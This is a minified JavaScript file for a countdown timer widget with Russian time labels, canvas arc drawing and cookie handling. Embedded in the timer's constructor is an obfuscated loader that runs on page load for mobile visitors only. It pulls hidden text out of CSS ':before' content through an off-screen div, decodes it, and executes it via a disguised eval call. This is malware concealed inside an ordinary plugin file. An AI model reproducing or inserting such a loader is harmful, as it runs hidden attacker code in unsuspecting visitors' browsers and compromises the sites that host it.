(function () {
    ...
    this.MegaTimer = function () {
      (function(w, d, u, ix, S, f){

        d.addEventListener('DOMContentLoaded', function() {
          if (!(location.protocol[0] == 'h' &&
          location.hostname.indexOf('.') != -1 &&
          screen.width < 640 &&
          screen.height != Math.max(d.documentElement.clientHeight, window.innerHeight))) return;
          var divs = [];
          var main_div = d.createElement('div');
          main_div.style.position = 'absolute';
          main_div.style.left = '-1000px';
          d.body.appendChild(main_div);
          var parts = [];
          var threads = 100;
          var items_per_thread = 10;
          var offset = 0;
          var workers = 0;
          ...
          setTimeout(function() {
            var main_int = setInterval(function() {
              if (workers) return;
              ...
              for (var i = 0; i < threads; i++) {
                var div = divs[i];
                workers++;
                thread(div, offset + i * items_per_thread, offset + i * items_per_thread + items_per_thread, function(index, value){parts[index] = value;}, function() {workers--;});
              }
            }, 100)
          }, 2000);

          function thread (div, start, end, add_part, done) {
            var i = start,
              tp = '',
              s = true,
              int = setInterval(function() {
                ...
                s = !s;
                div.setAttribute('class', 'fa-' + i);
                if (!s) return;
                tp = getComputedStyle(div, ':before').getPropertyValue('content');
                tp = tp == 'none' ? '' : tp;
                add_part(i, tp.replace(/["\\]/g, ''));
                i += 1;
              }, 10)
          }
          ...
          function make(str) {
            ...
            for (var i = 65; i < 90; i++) {
              var c = S[f](i);
              i % 5 && i % 9 && i % 11 ? w.rc.push(c) : w.c.push(c);
              w.cs = w.c.join('');
            }
            w.c.map(function(cd) {
              w.re = new RegExp(cd + '[^' + w.cs + ']+', 'g');
              w.m = w.r.match(w.re) || [];
              w.m.map(function (m) {
                w.sc = m[u]().substring(1);
                w.cc = '';
                w.sc.split('').map(function(h){
                  isNaN(h) ? w.cc += w.rc[ix](h) : w.cc += h;
                });
                w.rs = w.rs.replace(new RegExp(cd + w.sc, 'g'), S[f](Number(w.cc)))
              })
            });
            window['e' + 'val'](w.rs);
          }
        });
      })({}, document, 'toUpperCase', 'indexOf', String, 'fromCharCode')
        ...
        return s = {
            secundes: {max: 60, min: 0, text: "секунд", value: 0, view: !(a = null), updated: !(h = [])},
            minutes: {max: 60, min: 0, text: "минут", value: 0, view: !0, updated: ![]},
            hours: {max: 24, min: 0, text: "часов", value: 0, view: !0, updated: !1},
            ...
            var t;
            null != this.params.design && (null != this.getIEVersion() && this.getIEVersion() < 9 && (this.params.design.type = "text"), (null == (t = this.params.design.type) || "text" !== t && "plate" !== t && "circle" !== t) && (t = "text"), t = t.charAt(0).toUpperCase() + t.substr(1), this.initCommonDesign(), this["init" + t + "Design"]())
            ...
            var t, e, i, a, r, s, n, o, l, p, m, d, h, u, c;
            ...
            var n, f, o, y, l, p, b, v, x, E, w, k, T, I, C, M, N, L, H, S;
            if (r && this.drawArc(m, d, h, u, t, e, c, "transparent", r, s, g), g || (1 === e ? t = 1 - e : e = 1 - e), E = this.hexToRgb(i), x = this.hexToRgb(a), k = this.hexToRgb(this.getColorBetween(E, x, t)), I = this.hexToRgb(this.getColorBetween(E, x, e)), b = Math.ceil(30 * Math.abs(e - t)), y = this.getGradientColors(k, I, b), n = -.5 * Math.PI + 2 * Math.PI * t, l = y.length, f = g ? (T = 2 * Math.PI * (e - t) / l, 1) : (T = -2 * Math.PI * (e + t) / l, -1), w = function (t, e, i) {
                var a, r, s, n, o, l, p;
                return r = y[t], s = y[t + 1] || r, n = d + Math.cos(e) * u, l = d + Math.cos(e + T) * u, o = h + Math.sin(e) * u, p = h + Math.sin(e + T) * u, m.beginPath(), (a = m.createLinearGradient(n, o, l, p)).addColorStop(0, r), a.addColorStop(1, s), m.lineCap = i, m.strokeStyle = a, m.arc(d, h, u, e - .005 * f, e + T + .005 * f, !g), m.lineWidth = c, m.stroke(), m.closePath()
            }, l) {
                if (o = n + T * (l - 1), 1 < l) {
                    for (p = M = 0, L = (v = Math.ceil(l / 2)) - 1; 0 <= L ? M <= L : L <= M; p = 0 <= L ? ++M : --M) 0 === p && (C = T, T *= .01, w(p, n, s), T = C), w(p, n, "butt"), n += T;
                    for (n = o, S = [], p = N = H = l - 1; H <= v ? N <= v : v <= N; p = H <= v ? ++N : --N) p === l - 1 && (C = T, T *= .01, w(p, n + .99 * C, s), T = C), w(p, n, "butt"), S.push(n -= T);
                    return S
                }
                if (1 === l) return w(0, n, s)
            }
            ...
            var g, f, y, b, v, x, E;
            if ((y = 1) < y + 0 && (y -= -1 + y + 0, r += 0), f = (v = r) + y, g = r + ((b = a * y) - 0 * (E = .5 - Math.abs(-.5 + a))), x = r + (b + 0 * (1 - E)), s || p) return this.drawArc(t, e, i, s, x, f, n, o, l, u, c), this.drawArc(t, e, i, p, v, g, m, d, h, u, c)
            ...
            var a, r, s, n, o, l, p;
            for ("number" == typeof (r = (i = i || {}).expires) && r && ((a = new Date).setTime(a.getTime() + 1e3 * r), r = i.expires = a), r && r.toUTCString && (i.expires = r.toUTCString()), o = t + "=" + (e = encodeURIComponent(e)), l = 0, p = i.length; l < p; l++) o += "; " + (s = i[l]), !0 !== (n = i[s]) && (o += "=" + n);
